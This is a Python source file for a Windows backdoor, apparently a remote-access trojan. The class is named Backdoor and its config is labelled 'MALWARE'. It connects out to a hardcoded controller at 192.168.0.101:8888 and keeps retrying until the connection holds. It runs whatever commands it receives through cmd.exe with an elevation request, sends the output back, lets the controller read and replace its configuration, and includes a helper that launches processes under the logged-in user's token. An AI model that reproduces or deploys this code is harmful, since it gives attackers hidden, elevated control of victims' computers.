from local_libs.config import Config
import win32comext.shell.shell as shell
import socket
import json
import time
import os

import win32ts
import win32profile
import win32process
import win32con


class Backdoor:
    def __init__(self):
        self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
        self.config = Config("MALWARE")
        # self.email = Email(self.settings.smtp.server, self.settings.smtp.credentials)

        self.s = None
        self.server_ip = "192.168.0.101"
        self.server_port = 8888

    def __connect_to_server(self):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server_ip, self.server_port))
                break
            except:
                continue

    def run(self):
        self.__connect_to_server()
        # self.execute_admin_cmd("chcp 65001")

        while True:
            try:
                received_command = self.s.recv(1024 * 4).decode("utf-8")
                self.__handle_command(received_command)
            except ConnectionError:
                self.__connect_to_server()
            except socket.error:
                continue

    def __handle_command(self, command):
        if command == "start shell":
            self.__send_reverse_msg()
        elif command == "hello":
            pass
        elif command == "see config":
            self.__see_config()
        elif command.find("change config") == 0:
            config = command.split(" ")[-1]
            self.__change_config(config)
        else:
            self.__execute_shell(command)

    def __see_config(self):
        config_file = json.dumps(self.config.get().toDict(), indent=2)
        self.__send_reverse_msg(f"{config_file}")

    def __change_config(self, new_config):
        self.config.set(new_config)
        self.__send_reverse_msg(f"{new_config}\nSuccessfully executed")

    def __execute_shell(self, command):
        try:
            if command.find("cd") == 0:
                os.chdir(command[3:])
                self.__send_reverse_msg()
            else:
                self.__execute_admin_cmd(command)
                time.sleep(0.5)
                cmd_output = self.__get_cmd_output()
                self.__send_reverse_msg(f"{self.__get_ended_string(cmd_output)}Successfully executed")
        except Exception as error:
            self.__send_reverse_msg(f"Error: {error}")

    def __send_reverse_msg(self, msg=""):
        self.s.send(f"{self.__get_ended_string(msg)}{os.getcwd()} >> ".encode("utf-8"))

    def __get_ended_string(self, string):
        if len(string) > 0:
            return string+"\n"
        else:
            return ""

    def __execute_user_cmd(self, command):
        console_session_id = win32ts.WTSGetActiveConsoleSessionId()
        console_user_token = win32ts.WTSQueryUserToken(console_session_id)

        environment = win32profile.CreateEnvironmentBlock(console_user_token, False)

        startup_info = win32process.STARTUPINFO()
        startup_info.dwFlags = win32process.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = win32con.SW_NORMAL

        win32process.CreateProcessAsUser(console_user_token,
                                         fr"{command}",
                                         None,
                                         None,
                                         None,
                                         0,
                                         win32con.NORMAL_PRIORITY_CLASS,
                                         environment,
                                         None,
                                         startup_info)

    def __execute_admin_cmd(self, command):
        shell.ShellExecuteEx(lpVerb="runas", lpFile="cmd.exe",
                             lpParameters=fr"/c {command} > {self.commands_log_filepath}")

    def __get_cmd_output(self):
        with open(self.commands_log_filepath) as f:
            return f.read()

    def __del__(self):
        self.s.close()


if __name__ == "__main__":
    backdoor = Backdoor()
    backdoor.run()
